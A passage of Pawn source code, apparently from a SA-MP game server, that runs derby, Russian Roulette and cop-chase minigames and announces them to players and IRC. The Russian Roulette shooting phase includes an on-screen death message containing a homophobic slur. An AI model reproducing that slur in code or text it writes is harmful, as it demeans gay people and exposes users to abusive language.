		format(strings, sizeof(strings), "[S]: "EMBED_FLBLUE"%s has joined derby \"%s\" [Players: %d/%d Vehicle: %s]", playername, dj(DERBYFILE, derbystr), derbyplayers, DerbyMaxPlayers, aVehicleNames[DerbyVehicleID - 400]);
		for (new adp = 0; adp < MAX_PLAYERS; adp++)
		{
			if (IsPlayerConnected(adp) && player[adp][playingderby] == 1)
			SendClientMessage(adp, COLOR_NAVYBLUE, strings);
		}
	}
	TextDrawShowForPlayer(playerid, derbyhelptd1);
	TextDrawShowForPlayer(playerid, derbyhelptd2);

	if (derbysecondsleft <= 8)
	{
		format(derbystr, sizeof(derbystr), "D%d/SpawnInterior", DerbyID);
		new dpsI = djInt(DERBYFILE, derbystr);

		player[playerid][antifall] = 0;
		SetPlayerVirtualWorld(playerid, WORLDID_DERBY);
		SetPlayerInterior(playerid, dpsI);
		SetPlayerPos(playerid, DerbyCenterX, DerbyCenterY, DerbyCenterZ +5);

	    if (derbysecondsleft <= 5)
	    {
		    if (derbyplayers > DerbyMaxPlayers)
		    {
				format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
			    format(strings, sizeof(strings), "ServerError: ERROR #1 for derby \"%s\" (DerbyID %d)", dj(DERBYFILE, derbystr), DerbyID);
				SendServerMessageToAll(EMBED_DARKRED, strings);
				return 1;
			}

			player[playerid][godmode] = 0;
			player[playerid][vgodmode] = 0;
			player[playerid][vlights] = 0;
			player[playerid][ramps] = 0;
			if (player[playerid][strew] == 1)
			{
				player[playerid][strew] = 0;
				KillTimer(player[playerid][aftimer]);
				DestroyPlayerObject(playerid, player[playerid][strewid]);
				player[playerid][strewid] = -1;
			}
			
			SetPlayerHealth(playerid, 100.0);
			TextDrawHideForPlayer(playerid, derbyhelptd1);
			TextDrawHideForPlayer(playerid, derbyhelptd2);

		    format(derbystr, sizeof(derbystr), "D%d/Spawn%d/X", DerbyID, derbyplayers);
			if (!djIsSet(DERBYFILE, derbystr))
			{
		        RemoveDerbyPlayer(playerid, "Error #3");
        		SpawnPlayer(playerid);
				return 1;
			}
			new Float:dpsX = djFloat(DERBYFILE, derbystr); // to prevent falling through map
		 	format(derbystr, sizeof(derbystr), "D%d/Spawn%d/Y", DerbyID, derbyplayers);
			new Float:dpsY = djFloat(DERBYFILE, derbystr);
		 	format(derbystr, sizeof(derbystr), "D%d/Spawn%d/Z", DerbyID, derbyplayers);
			new Float:dpsZ = djFloat(DERBYFILE, derbystr);
		 	format(derbystr, sizeof(derbystr), "D%d/Spawn%d/A", DerbyID, derbyplayers);
			new Float:dpsA = djFloat(DERBYFILE, derbystr);

			new dvehicleid = CreateVehicle(DerbyVehicleID, dpsX, dpsY, dpsZ, dpsA, CustomVehicleColors[random(29)], CustomVehicleColors[random(29)], 3600000);
			SetVehicleVirtualWorld(dvehicleid, WORLDID_DERBY);
			LinkVehicleToInterior(dvehicleid, dpsI);
			PutPlayerInVehicle(playerid, dvehicleid, 0);
			TogglePlayerControllable(playerid, 0);
			SetPlayerColor(playerid, COLOR_RED);

			for (new i = 0; i < VIP_MAX_OSTICKS; i++)
			{
			    if (pSObject[playerid][i][so_object] != -1)
				{
				    DestroyObject(pSObject[playerid][i][so_object]);
					pSObject[playerid][i][so_object] = -1;
				}
			}

			for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
			{
				if (IsPlayerAttachedObjectSlotUsed(playerid, pi))
				RemovePlayerAttachedObject(playerid, pi);
			}
		}
	}

	if (derbyplayers == DerbyMaxPlayers && derbysecondsleft >= 10)
	{
		PreloadDerby();
	    derbysecondsleft = 7;
	}
	return 1;
}

stock RemoveDerbyPlayer(playerid, reason[])
{
	derbyplayers--;
	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "[S]: "EMBED_FLBLUE"%s left the derby (%s)", playername, reason);
	for (new adp = 0; adp < MAX_PLAYERS; adp++)
	{
		if (IsPlayerConnected(adp) && player[adp][playingderby] == 1)
		SendClientMessage(adp, COLOR_NAVYBLUE, strings);
	}

	format(strings, sizeof(strings), "2 %s left the derby (%s)", playername, reason);
	IRC_GroupSay(1, IRC_CHANNEL, strings);
	if (servergodmode) player[playerid][godmode] = 1;
	SetPlayerColor(playerid, PlayerColors[random(sizeof(PlayerColors))]);
	player[playerid][playingderby] = 0;
	TextDrawHideForPlayer(playerid, derbyhelptd1);
	TextDrawHideForPlayer(playerid, derbyhelptd2);

	if (derbyplayers <= 1 && derbystarted == true)
	{
 		new winnerfound = 0;
		for (new dp = 0; dp < MAX_PLAYERS; dp++)
		{
			if (IsPlayerConnected(dp) && player[dp][playingderby] == 1)
			{
				GetPlayerName(dp, playername, sizeof(playername));
				format(strings, sizeof(strings), "%s has won the derby!", playername);
				SendServerMessageToAll(EMBED_FLBLUE, strings);
				format(strings, sizeof(strings), "2 %s has won the derby!", playername);
				IRC_GroupSay(1, IRC_CHANNEL, strings);
				player[dp][playingderby] = 0;
 				new vDID = GetPlayerVehicleID(dp);
	    		if (vDID)
				{
					RemovePlayerFromVehicleEx(dp);
					DestroyVehicle(vDID);
				}
				SpawnPlayer(dp);
				StopDerby();
				GivePlayerMoney(dp, 100000);
				winnerfound = 1;
				if (servergodmode) player[dp][godmode] = 1;
				SetPlayerColor(dp, PlayerColors[random(sizeof(PlayerColors))]);
				TextDrawHideForPlayer(dp, derbyhelptd1);
				TextDrawHideForPlayer(dp, derbyhelptd2);
			    break;
		    }
		}
		if (winnerfound == 0)
		{
			StopDerby();
			SendServerMessageToAll(EMBED_FLBLUE, "Stopped Derby (No winner found)");
			IRC_GroupSay(1, IRC_CHANNEL, "2Stopped Derby (No winner found)");
		}
	}
	return 1;
}

stock PreloadDerby()
{
	format(derbystr, sizeof(derbystr), "D%d/Loadmap", DerbyID);
	if (djIsSet(DERBYFILE, derbystr))
	{
	    strmid(DerbyRelatedMap, dj(DERBYFILE, derbystr), 0, sizeof(DerbyRelatedMap));
		new MapName[100];
		format(MapName, sizeof(MapName), "Maps/%s.ini", DerbyRelatedMap);
		CallRemoteFunction("LoadMapMode", "ssi", MapName, DerbyRelatedMap, WORLDID_DERBY);
	}

	format(derbystr, sizeof(derbystr), "D%d/SpawnInterior", DerbyID);
	new dpsI = djInt(DERBYFILE, derbystr, false);

	for (new dp = 0; dp < MAX_PLAYERS; dp++)
	{
		if (IsPlayerConnected(dp) && player[dp][playingderby] == 1)
		{
			player[dp][antifall] = 0;
			SetPlayerVirtualWorld(dp, WORLDID_DERBY);
			SetPlayerInterior(dp, dpsI);
			SetPlayerPos(dp, DerbyCenterX, DerbyCenterY, DerbyCenterZ +5);
		}
	}
	return 1;
}

stock LoadDerby()
{
	if (derbyplayers < MIN_DERBY_PLAYERS)
	{
		SendServerMessageToAll(EMBED_FLBLUE, "Derby has not started because there were not enough players.");
		IRC_GroupSay(1, IRC_CHANNEL, "2Derby has not started because there were not enough players.");

		for (new dp = 0; dp < MAX_PLAYERS; dp++)
		{
			if (IsPlayerConnected(dp) && player[dp][playingderby] == 1)
			{
				GameTextForPlayer(dp, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~                       ~w~DERBY ~r~STOPPED!", 2000, 3);
				player[dp][playingderby] = 0;
				if (servergodmode) player[dp][godmode] = 1;
				SpawnPlayer(dp);
				TextDrawHideForPlayer(dp, derbyhelptd1);
				TextDrawHideForPlayer(dp, derbyhelptd2);
		    }
		}

		StopDerby();
	    return 1;
	}

    new Float:dpsX,
		Float:dpsY,
		Float:dpsZ,
		Float:dpsA,
		dpsI,
		dvehicleid,
		dvehicleused = 1;

	format(derbystr, sizeof(derbystr), "D%d/SpawnInterior", DerbyID);
	dpsI = djInt(DERBYFILE, derbystr, false);

	for (new dp = 0; dp < MAX_PLAYERS; dp++)
	{
		if (IsPlayerConnected(dp) && player[dp][playingderby] == 1)
		{
		    if (dvehicleused > DerbyMaxPlayers)
		    {
				format(derbystr, sizeof(derbystr), "D%d/Comment", DerbyID);
			    format(strings, sizeof(strings), "ServerError: No (enough) spawn was set for derby \"%s\" (DerbyID %d)", dj(DERBYFILE, derbystr), DerbyID);
				SendServerMessageToAll(EMBED_DARKRED, strings);
				return 1;
			}

			player[dp][antifall] = 0;
			player[dp][godmode] = 0;
			player[dp][vgodmode] = 0;
            player[dp][vlights] = 0;
			player[dp][ramps] = 0;
			if (player[dp][strew] == 1)
			{
				player[dp][strew] = 0;
				KillTimer(player[dp][aftimer]);
				DestroyPlayerObject(dp, player[dp][strewid]);
				player[dp][strewid] = -1;
			}
			
			ResetPlayerWeapons(dp);
			SetPlayerHealth(dp, 100.0);

		    format(derbystr, sizeof(derbystr), "D%d/Spawn%d/X", DerbyID, dvehicleused);
			if (!djIsSet(DERBYFILE, derbystr))
			{
		        RemoveDerbyPlayer(dp, "Error #3");
        		SpawnPlayer(dp);
				continue;
			}
			dpsX = djFloat(DERBYFILE, derbystr);
		 	format(derbystr, sizeof(derbystr), "D%d/Spawn%d/Y", DerbyID, dvehicleused);
			dpsY = djFloat(DERBYFILE, derbystr);
		 	format(derbystr, sizeof(derbystr), "D%d/Spawn%d/Z", DerbyID, dvehicleused);
			dpsZ = djFloat(DERBYFILE, derbystr);
		 	format(derbystr, sizeof(derbystr), "D%d/Spawn%d/A", DerbyID, dvehicleused);
			dpsA = djFloat(DERBYFILE, derbystr);

			dvehicleid = CreateVehicle(DerbyVehicleID, dpsX, dpsY, dpsZ, dpsA, CustomVehicleColors[random(29)], CustomVehicleColors[random(29)], 3600000);
			SetVehicleVirtualWorld(dvehicleid, WORLDID_DERBY);
			LinkVehicleToInterior(dvehicleid, dpsI);
			PutPlayerInVehicle(dp, dvehicleid, 0);
			TogglePlayerControllable(dp, 0);
			dvehicleused++;
			SetPlayerColor(dp, COLOR_RED);
			TextDrawHideForPlayer(dp, derbyhelptd1);
			TextDrawHideForPlayer(dp, derbyhelptd2);

			for (new i = 0; i < VIP_MAX_OSTICKS; i++)
			{
			    if (pSObject[dp][i][so_object] != -1)
			    {
				    DestroyObject(pSObject[dp][i][so_object]);
					pSObject[dp][i][so_object] = -1;
				}
			}

			for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
			{
				if (IsPlayerAttachedObjectSlotUsed(dp, pi))
				RemovePlayerAttachedObject(dp, pi);
			}
		}
	}
	return 1;
}

stock StartDerby()
{
	for (new dp = 0; dp < MAX_PLAYERS; dp++)
	{
		if (IsPlayerConnected(dp) && player[dp][playingderby] == 1)
		{
			TogglePlayerControllable(dp, 1);
			GameTextForPlayer(dp, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~DERBY ~g~STARTED!", 2000, 3);
		}
	}

    derbystarted = true;
	SendServerMessageToAll(EMBED_FLBLUE, "Derby has started!");
	IRC_GroupSay(1, IRC_CHANNEL, "2Derby has started!");
	
	//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_derbies_played) VALUES (CURDATE(), 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_derbies_played` = server_statistic_derbies_played +1", false, "", "");
	return 1;
}

stock StopDerby()
{
	derbystarted = false;
	derbyplayers = 0;
	derbysecondsleft = -5;
	DerbyVehicleID = DEFAULT_DERBY_VEHICLE;
	DerbyMaxPlayers = -1;

	format(derbystr, sizeof(derbystr), "D%d/Loadmap", DerbyID);
	if (djIsSet(DERBYFILE, derbystr))
	{
		new MapName[100];
		format(MapName, sizeof(MapName), "Maps/%s.ini", DerbyRelatedMap);
		CallRemoteFunction("UnloadMapMode", "ss", MapName, DerbyRelatedMap);
	}
	DerbyID = 0;
	DerbyRelatedMap = "nonexmovie";
	return 1;
}

stock AddRRPlayer(playerid)
{
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	player[playerid][playingrr] = 1;
	rrplayers++;

	GetPlayerName(playerid, playername, sizeof(playername));
	if (rrplayers == 1)
	{
		format(strings, sizeof(strings), "%s has started Russian Roulette [/rr - Max.Players: %d]", playername, MAX_RR_PLAYERS);
		SendServerMessageToAll(EMBED_SEAGREEN, strings);
		format(strings, sizeof(strings), "2 %s has started Russian Roulette [/rr - Max.Players: %d]", playername, MAX_RR_PLAYERS);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		rrsecondsleft = 35;
	} else {
		format(strings, sizeof(strings), "[S]: "EMBED_SEAGREEN"%s has joined Russian Roulette [Players: %d/%d]", playername, rrplayers, MAX_RR_PLAYERS);
		for (new arp = 0; arp < MAX_PLAYERS; arp++)
		{
			if (IsPlayerConnected(arp) && player[arp][playingrr] == 1)
			SendClientMessage(arp, COLOR_NAVYBLUE, strings);
		}
	}
	TextDrawShowForPlayer(playerid, rrhelptd1);
	TextDrawShowForPlayer(playerid, rrhelptd2);

	if (rrsecondsleft <= 5)
	{
		SetPlayerVirtualWorld(playerid, WORLDID_DEFAULT);
		SetPlayerInterior(playerid, 10);

		if (rrplayers > MAX_RR_PLAYERS)
  		{
			SendServerMessageToAll(EMBED_DARKRED, "ServerError: ERROR #1 for Russian Roulette");
			return 1;
		}

		player[playerid][antifall] = 0;
		TextDrawHideForPlayer(playerid, rrhelptd1);
		TextDrawHideForPlayer(playerid, rrhelptd2);
		switch(rrplayers)
		{
			case 1:
		    {
		        SetPlayerPos(playerid, 1993.84, 1019.15, 994.89);
		        SetPlayerFacingAngle(playerid, 180.00);
				playerxyza[0] = 1993.84;
				playerxyza[1] = 1019.15;
				playerxyza[2] = 994.89;
				playerxyza[3] = 180.00;
		    }
		    case 2:
		    {
      			SetPlayerPos(playerid, 1993.81, 1016.35, 994.89);
		        SetPlayerFacingAngle(playerid, 0.00);
				playerxyza[0] = 1993.81;
				playerxyza[1] = 1016.35;
				playerxyza[2] = 994.89;
				playerxyza[3] = 360.00;
		    }
		    case 3:
		    {
		    	SetPlayerPos(playerid, 1995.12, 1018.71, 994.89);
		        SetPlayerFacingAngle(playerid, 125.00);
				playerxyza[0] = 1995.12;
				playerxyza[1] = 1018.71;
				playerxyza[2] = 994.89;
				playerxyza[3] = 124.93;
		    }
		    case 4:
		    {
		    	SetPlayerPos(playerid, 1992.47, 1016.88, 994.89);
		        SetPlayerFacingAngle(playerid, 305.00);
		        playerxyza[0] = 1992.47;
		        playerxyza[1] = 1016.88;
		        playerxyza[2] = 994.89;
		        playerxyza[3] = 305.89;
		    }
		    case 5:
		    {
		    	SetPlayerPos(playerid, 1994.91, 1016.88, 994.89);
		        SetPlayerFacingAngle(playerid, 50.00);
				playerxyza[0] = 1994.91;
				playerxyza[1] = 1016.88;
				playerxyza[2] = 994.89;
				playerxyza[3] = 50.12;
		    }
		    case 6:
		    {
		    	SetPlayerPos(playerid, 1992.47, 1018.71, 994.89);
		        SetPlayerFacingAngle(playerid, 230.00);
				playerxyza[0] = 1992.47;
				playerxyza[1] = 1018.71;
				playerxyza[2] = 994.89;
				playerxyza[3] = 230.77;
			}
		}
		SetPlayerCameraLookAt(playerid, 1993.75, 1017.78, 995.0);
		playerxyza[0] -= (6 * floatsin(-playerxyza[3], degrees));
		playerxyza[1] -= (6 * floatcos(-playerxyza[3], degrees));
   		SetPlayerCameraPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]+6);

		player[playerid][godmode] = 0;
		player[playerid][vgodmode] = 0;
		player[playerid][vlights] = 0;
		if (player[playerid][strew] == 1)
		{
			player[playerid][strew] = 0;
			KillTimer(player[playerid][aftimer]);
			DestroyPlayerObject(playerid, player[playerid][strewid]);
			player[playerid][strewid] = -1;
		}
		
		TogglePlayerControllable(playerid, 0);
		SetPlayerColor(playerid, COLOR_PINK);
  		SetPlayerHealth(playerid, 100.0);

		for (new i = 0; i < VIP_MAX_OSTICKS; i++)
		{
		    if (pSObject[playerid][i][so_object] != -1)
		    {
			    DestroyObject(pSObject[playerid][i][so_object]);
				pSObject[playerid][i][so_object] = -1;
			}
		}

		for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
		{
			if (IsPlayerAttachedObjectSlotUsed(playerid, pi))
			RemovePlayerAttachedObject(playerid, pi);
		}
	}

	if (rrplayers == MAX_RR_PLAYERS && rrsecondsleft >= 10)
	{
		LoadRR();
	    rrsecondsleft = 4;
	}
	return 1;
}

stock RemoveRRPlayer(playerid, reason[])
{
	rrplayers--;
	GetPlayerName(playerid, playername, sizeof(playername));
	format(strings, sizeof(strings), "[S]: "EMBED_SEAGREEN"%s left Russian Roulette (%s)", playername, reason);
	for (new arp = 0; arp < MAX_PLAYERS; arp++)
	{
		if (IsPlayerConnected(arp) && player[arp][playingrr] == 1)
		SendClientMessage(arp, COLOR_NAVYBLUE, strings);
	}

	format(strings, sizeof(strings), "2 %s left Russian Roulette (%s)", playername, reason);
	IRC_GroupSay(1, IRC_CHANNEL, strings);
	if (servergodmode) player[playerid][godmode] = 1;
	SetPlayerColor(playerid, PlayerColors[random(sizeof(PlayerColors))]);
	player[playerid][playingrr] = 0;
	SpawnPlayer(playerid);
	TextDrawHideForPlayer(playerid, rrhelptd1);
	TextDrawHideForPlayer(playerid, rrhelptd2);

	if (rrplayers < MIN_NADEBALL_PLAYERS && rrstarted == true)
	{
 		new winnerfound = 0;
		for (new rp = 0; rp < MAX_PLAYERS; rp++)
		{
			if (IsPlayerConnected(rp) && player[rp][playingrr] == 1)
			{
				GetPlayerName(rp, playername, sizeof(playername));
				format(strings, sizeof(strings), "%s has won Russian Roulette!", playername);
				SendServerMessageToAll(EMBED_SEAGREEN, strings);
				format(strings, sizeof(strings), "2 %s has won Russian Roulette!", playername);
				IRC_GroupSay(1, IRC_CHANNEL, strings);
				player[rp][playingrr] = 0;
				SpawnPlayer(rp);
				StopRR();
				GivePlayerMoney(rp, 100000);
				winnerfound = 1;
				if (servergodmode) player[rp][godmode] = 1;
				SetPlayerColor(rp, PlayerColors[random(sizeof(PlayerColors))]);
				TextDrawHideForPlayer(rp, rrhelptd1);
				TextDrawHideForPlayer(rp, rrhelptd2);
			    break;
		    }
		}
		if (winnerfound == 0)
		{
			StopRR();
			SendServerMessageToAll(EMBED_SEAGREEN, "Stopped Russian Roulette (No winner found)");
			IRC_GroupSay(1, IRC_CHANNEL, "2Stopped Russian Roulette (No winner found)");
		}
	}

	if (playerid == currentrruser)
	{
		/*format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~rejecting %s~n~for leaving server", playername);
		SendMessageToRR(stringe, 5000);
		SetTimerEx("SetRRPhase", 5000, 0, "d", 1);*/
		SetRRPhase(1);
	}

	return 1;
}

stock LoadRR()
{
	if (rrplayers < MIN_NADEBALL_PLAYERS)
	{
		SendServerMessageToAll(EMBED_SEAGREEN, "Russian Roulette was not started because there were not enough players.");
		IRC_GroupSay(1, IRC_CHANNEL, "2Russian Roulette was not started because there were not enough players.");

		for (new dp = 0; dp < MAX_PLAYERS; dp++)
		{
			if (IsPlayerConnected(dp) && player[dp][playingrr] == 1)
			{
				GameTextForPlayer(dp, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~                       ~w~RUSSIAN ROULETTE ~r~STOPPED!", 2000, 3);
				player[dp][playingrr] = 0;
				if (servergodmode) player[dp][godmode] = 1;
				TextDrawHideForPlayer(dp, rrhelptd1);
				TextDrawHideForPlayer(dp, rrhelptd2);
		    }
		}

		StopRR();
	    return 1;
	}

	new rplaceused = 1;
	for (new rp = 0; rp < MAX_PLAYERS; rp++)
	{
		if (IsPlayerConnected(rp) && player[rp][playingrr] == 1)
		{
		    if (rplaceused > MAX_RR_PLAYERS)
		    {
				SendServerMessageToAll(EMBED_DARKRED, "ServerError: ERROR #1 for Russian Roulette");
				return 1;
			}

			player[rp][antifall] = 0;
			player[rp][godmode] = 0;
			player[rp][vgodmode] = 0;
			player[rp][vlights] = 0;
			player[rp][ramps] = 0;
			if (player[rp][strew] == 1)
			{
				player[rp][strew] = 0;
				KillTimer(player[rp][aftimer]);
				DestroyPlayerObject(rp, player[rp][strewid]);
				player[rp][strewid] = -1;
			}
			
			ResetPlayerWeapons(rp);
			TogglePlayerControllable(rp, 0);
			SetPlayerVirtualWorld(rp, WORLDID_DEFAULT);
			SetPlayerInterior(rp, 10);
			SetPlayerHealth(rp, 100.0);
			TextDrawHideForPlayer(rp, rrhelptd1);
			TextDrawHideForPlayer(rp, rrhelptd2);

			switch(rplaceused)
			{
			    case 1:
			    {
			        SetPlayerPos(rp, 1993.84, 1019.15, 994.89);
			        SetPlayerFacingAngle(rp, 180.00);
					playerxyza[0] = 1993.84;
					playerxyza[1] = 1019.15;
					playerxyza[2] = 994.89;
					playerxyza[3] = 180.00;
			    }
			    case 2:
			    {
	      			SetPlayerPos(rp, 1993.81, 1016.35, 994.89);
			        SetPlayerFacingAngle(rp, 0.00);
					playerxyza[0] = 1993.81;
					playerxyza[1] = 1016.35;
					playerxyza[2] = 994.89;
					playerxyza[3] = 360.00;
			    }
			    case 3:
			    {
			    	SetPlayerPos(rp, 1995.12, 1018.71, 994.89);
			        SetPlayerFacingAngle(rp, 125.00);
					playerxyza[0] = 1995.12;
					playerxyza[1] = 1018.71;
					playerxyza[2] = 994.89;
					playerxyza[3] = 124.93;
			    }
			    case 4:
			    {
			    	SetPlayerPos(rp, 1992.47, 1016.88, 994.89);
			        SetPlayerFacingAngle(rp, 305.00);
			        playerxyza[0] = 1992.47;
			        playerxyza[1] = 1016.88;
			        playerxyza[2] = 994.89;
			        playerxyza[3] = 305.89;
			    }
			    case 5:
			    {
			    	SetPlayerPos(rp, 1994.91, 1016.88, 994.89);
			        SetPlayerFacingAngle(rp, 50.00);
					playerxyza[0] = 1994.91;
					playerxyza[1] = 1016.88;
					playerxyza[2] = 994.89;
					playerxyza[3] = 50.12;
			    }
			    case 6:
			    {
			    	SetPlayerPos(rp, 1992.47, 1018.71, 994.89);
			        SetPlayerFacingAngle(rp, 230.00);
					playerxyza[0] = 1992.47;
					playerxyza[1] = 1018.71;
					playerxyza[2] = 994.89;
					playerxyza[3] = 230.77;
				}
			}
			SetPlayerCameraLookAt(rp, 1993.75, 1017.78, 995.0);
			playerxyza[0] -= (6 * floatsin(-playerxyza[3], degrees));
			playerxyza[1] -= (6 * floatcos(-playerxyza[3], degrees));
	   		SetPlayerCameraPos(rp, playerxyza[0], playerxyza[1], playerxyza[2]+6);

			rplaceused++;
			SetPlayerColor(rp, COLOR_PINK);
   			SetPlayerHealth(rp, 100.0);
   			
			for (new i = 0; i < VIP_MAX_OSTICKS; i++)
			{
			    if (pSObject[rp][i][so_object] != -1)
			    {
				    DestroyObject(pSObject[rp][i][so_object]);
					pSObject[rp][i][so_object] = -1;
				}
			}

			for (new pi = 0; pi < VIP_MAX_POSTICKS; pi++)
			{
				if (IsPlayerAttachedObjectSlotUsed(rp, pi))
				RemovePlayerAttachedObject(rp, pi);
			}
		}
	}
	return 1;
}

stock StartRR()
{
    rrstarted = true;
	SetRRPhase(0);

	for (new rp = 0; rp < MAX_PLAYERS; rp++)
	{
	    if (IsPlayerConnected(rp) && player[rp][playingrr] == 1)
	    {
			GameTextForPlayer(rp, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~w~RUSSIAN ROULETTE ~g~STARTED!", 2000, 3);
		}
	}

	SendServerMessageToAll(EMBED_SEAGREEN, "Russian Roulette has started!");
	IRC_GroupSay(1, IRC_CHANNEL, "2Russian Roulette has started!");
	
	//mysql_run_query(mysqlConnection, "INSERT INTO "MYSQL_TABLE_SERVER_STATISTICS" (server_statistic_date, server_statistic_russianroulette_played) VALUES (CURDATE(), 1) ON DUPLICATE KEY UPDATE `server_statistic_id` = LAST_INSERT_ID(server_statistic_id), `server_statistic_russianroulette_played` = server_statistic_russianroulette_played +1", false, "", "");
	return 1;
}

public SetRRPhase(phase)
{
	if (!rrstarted)
	return 1;

	new rrname[24];
	switch(phase)
	{
	    case 0: // preparing players
	    {
			for (new rp = 0; rp < MAX_PLAYERS; rp++)
			{
				if (IsPlayerConnected(rp) && player[rp][playingrr] == 1)
				{
					GameTextForPlayer(rp, "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~STARTING RUSSIAN ROULETTE..", 5000, 3);

					//preload animations
 					ApplyAnimation(currentrruser, "COLT45", "null",0.0,0,0,0,0,0);
 					ApplyAnimation(currentrruser, "SILENCED", "null",0.0,0,0,0,0,0);
 					ApplyAnimation(currentrruser, "PED", "null",0.0,0,0,0,0,0);
 					ApplyAnimation(currentrruser, "STRIP", "null",0.0,0,0,0,0,0);

 					ApplyAnimation(rp, "STRIP", "PUN_HOLLER", 4.1, 0, 1, 1, 1, 1, 1);
 					ResetPlayerWeapons(rp);
				}
			}
			SetTimerEx("SetRRPhase", 5000, 0, "d", 1);
	    }
	    case 1:
	    {
	    	for (new rp = currentrruser+1; rp < MAX_PLAYERS; rp++)
			{
				//printf("FINDFIRSTINLINE: %d", rp);
				if (IsPlayerConnected(rp) && player[rp][playingrr] == 1)
				{
					currentrruser = rp;
					//printf("FOUND-FINDFIRSTINLINE: %d", rp);
				    goto continuerr;
				}

				if (rp == MAX_PLAYERS-1) // sort of end of nrp loop -- cannot find RR player -- start from beginning else stop RR !
				{
				    new foundnextinline = 0;
				   	for (new lrp = 0; lrp < MAX_PLAYERS; lrp++)
					{
						if (IsPlayerConnected(lrp) && player[lrp][playingrr] == 1)
						{
							currentrruser = lrp;
							foundnextinline = 1;
							//printf("STARTFROMBEGIN: %d - %d - %d", currentrruser, rp, lrp);
						    goto continuerr;
						}
					} // end lrp loop
					if (foundnextinline == 0)
					{
						return StopRR();
					}
				}
			} // end rp loop

			continuerr:
			GivePlayerWeapon(currentrruser, 24, 1);
			GetPlayerName(currentrruser, rrname, sizeof(rrname));
			format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~           %s's turn!", rrname);
			SendMessageToRR(stringe, 30000);
			rrsecondslefttillnext = 30;
 			SendClientMessage(currentrruser, COLOR_LBLUE, "Please load and spin the weapon using /spin.");
	    }
	    case 2: // load gun
	    {
	    	ApplyAnimation(currentrruser, "COLT45", "colt45_reload", 4.1, 0, 1, 1, 1, 1, 1);
	        isgunspun = true;
  			GetPlayerName(currentrruser, rrname, sizeof(rrname));
			format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~%s~n~slowly loads the gun..", rrname);
			SendMessageToRR(stringe, 30000);
   			currentrrbullet = random( random(6) );
  			SetTimerEx("SetRRPhase", 4000, 0, "d", 3);
	    }
	    case 3: // spin
	    {
			ApplyAnimation(currentrruser, "SILENCED", "Silence_reload", 4.1, 0, 1, 1, 1, 1, 1);
    		GetPlayerName(currentrruser, rrname, sizeof(rrname));
			format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~%s~n~spins the cylinder..", rrname);
			SendMessageToRR(stringe, 30000);
	        isgunspundone = true;
			SendClientMessage(currentrruser, COLOR_LBLUE, "Please pull the trigger using /fire.");
	    }
	    case 4: // shoot
	    {
     		isgunspun = false;
     		isgunspundone = false;
    		GetPlayerName(currentrruser, rrname, sizeof(rrname));
     		if (random( random(6) ) == currentrrbullet)
	        {
				CreateExplosion(1992.14, 1016.93, 1000.00, 8, 0.0);
   				ApplyAnimation(currentrruser, "PED", "KO_shot_face", 4.1, 0, 1, 1, 1, 1, 1);
	            switch( random(2) )
	            {
					case 0: format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~r~]BANG, GAME OVER FAGGOT~n~~w~%s was killed.", rrname);
					case 1: format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~r~]BANG, ANOTHER ONE BITES THE DUST~n~~w~%s was killed.", rrname);
				}
				for (new rp = 0; rp < MAX_PLAYERS; rp++)
				{
					if (IsPlayerConnected(rp) && player[rp][playingrr] == 1)
					{
	     				TextDrawShowForPlayer(rp, RRblood);
						GameTextForPlayer(rp, stringe, 6000, 3);
					}
				}
				SetTimerEx("SetRRPhase", 300, 0, "d", 5);
				SetTimerEx("SetRRPhase", 6000, 0, "d", 6);
	        } else {
	        	ApplyAnimation(currentrruser, "PED", "facanger", 4.1, 0, 1, 1, 1, 1, 1);
				format(stringe, sizeof(stringe), "~n~~n~~n~~n~~n~~n~~n~~n~~n~~n~~g~]EMPTY~n~~w~%s survived.", rrname);
				SendMessageToRR(stringe, 5000);
				SetTimerEx("SetRRPhase", 5000, 0, "d", 1);
	        }
			ResetPlayerWeapons(currentrruser);
	    }
	    case 5: // hide blood textdraw
	    {
	    	for (new rp = 0; rp < MAX_PLAYERS; rp++)
			{
				if (IsPlayerConnected(rp) && player[rp][playingrr] == 1)
	    		TextDrawHideForPlayer(rp, RRblood);
			}
	    }
	    case 6: // remove player
	    {
			RemoveRRPlayer(currentrruser, "Died");
			//SetRRPhase(1);
	    }
	}
	return 1;
}

stock StopRR()
{
	rrstarted = false;
	rrplayers = 0;
	rrsecondsleft = -5;
	currentrruser = random(MAX_PLAYERS/2);
	currentrrbullet = -1;
	isgunspun = false;
	isgunspundone = false;
	return 1;
}

stock AddCCPlayer(playerid)
{
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE);
	player[playerid][playingcc] = 1;
	ccplayers++;

	GetPlayerName(playerid, playername, sizeof(playername));
	if (ccplayers == 1)
	{
		format(strings, sizeof(strings), "%s has started a cop chase [/copchase - Max.Players: %d]", playername, MAX_COPCHASE_PLAYERS);
		SendServerMessageToAll(EMBED_ORANGE, strings);
		format(strings, sizeof(strings), "2 %s has started a cop chase [/copchase - Max.Players: %d]", playername, MAX_COPCHASE_PLAYERS);
		IRC_GroupSay(1, IRC_CHANNEL, strings);
		ccsecondsleft = 35;
